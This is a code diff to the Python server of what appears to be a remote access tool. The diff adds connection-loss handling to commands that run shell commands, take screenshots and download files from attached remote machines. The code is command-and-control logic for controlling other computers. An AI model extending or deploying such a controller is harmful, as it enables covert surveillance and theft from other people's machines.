@@ -31,7 +31,7 @@ class Server(object):
         return self.connectedUsers[self.userAttached]
 
     # basic information of session you are
-    def sessionInfo(self, args=''):
+    def sessionInfo(self, args):
         if self.userAttached:
             userInfo = self.getCurrentUser()
             hour, minute, second = self.calculateElapsedTime(time()-userInfo["initialTime"]) # elapsed session time
@@ -47,7 +47,7 @@ class Server(object):
             printr(f'[red] No session currently attached.')
 
     # basic information from attached user
-    def userInfo(self, args=''):
+    def userInfo(self, args):
         if self.userAttached:
             user = self.getCurrentUser()
             printr(''.join(f'{key}: {value}\n' for key, value in user.items() if key not in ['conn', 'currentDirectory', 'initialTime']))
@@ -67,7 +67,7 @@ class Server(object):
             printr('Info: Attaches to an active session. [green]Ex: /attach zNairy-PC')
 
     # detach a active session
-    def detach(self, name):
+    def detach(self, name=''):
         if self.userAttached:
             self.userAttached = self.userCwd = ''
         else:
@@ -146,11 +146,15 @@ class Server(object):
             if args:
                 connection = self.getCurrentUser()['conn']
                 connection.send(self.lastCommand.encode())
-                header = loads(connection.recv(512))
-                if header["sucess"]:
-                    self.receiveFile(connection, header)
-                else:
-                    printr(f'[red]{header["content"]}')
+                try:
+                    header = loads(connection.recv(512))
+                    if header["sucess"]:
+                        self.receiveFile(connection, header)
+                    else:
+                        printr(f'[red]{header["content"]}')
+                except EOFError:
+                    printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
+                    self.removecurrentSession() # removing the current session because connection probaly was lost
             else:
                 printr('Info: Download an external file. [green]Ex: /download sóastop.mp3')
         else:
@@ -163,8 +167,12 @@ class Server(object):
         if self.userAttached:
             connection = self.getCurrentUser()['conn']
             connection.send('/screenshot'.encode())
-            header = loads(connection.recv(512))
-            self.receiveFile(connection, header)
+            try:
+                header = loads(connection.recv(512))
+                self.receiveFile(connection, header)
+            except EOFError:
+                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
+                self.removecurrentSession() # removing the current session because connection probaly was lost
         else:
             printr('[yellow] No session currently attached.')
 
@@ -184,6 +192,11 @@ class Server(object):
     def addUser(self, data):
         self.connectedUsers.update({data['name']: data})
     
+    # removing the current session attached
+    def removecurrentSession(self):
+        self.connectedUsers.pop(self.userAttached)
+        self.detach()
+
     # removing the user from a session 
     def removeUserSession(self, name):
         if name:
@@ -252,7 +265,7 @@ class Server(object):
             "/contact": {"local": True, "action": self.showContact},
             "/version": {"local": True, "action": self.showVersion},
             "/lastcommand": {"local": True, "action": self.showLastCommand},
-            "/internalcommands": {"local": True, "action": self.internalcommands},
+            "/internalcommands": {"local": True, "action": self.internalcommands}
         }
 
         commands.update({"/commands": {"local": True, "action": self.availableCommands}}) # adding /commands to show all commands available to use
@@ -295,9 +308,13 @@ class Server(object):
         if self.userAttached: # if exists session attached
             connection = self.getCurrentUser()['conn'] # getting the socket object from the current user
             connection.send(command.encode())
-            header = loads(connection.recv(512)) # receiving header of the command
-            self.userCwd = header['currentDirectory'] # updating the current directory you are
-            self.receiveCommand(connection, header)
+            try:
+                header = loads(connection.recv(512)) # receiving header of the command
+                self.userCwd = header['currentDirectory'] # updating the current directory you are
+                self.receiveCommand(connection, header)
+            except EOFError:
+                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
+                self.removecurrentSession() # removing the current session because connection probaly was lost
         else:
             printr('[yellow] No session currently attached.')
 
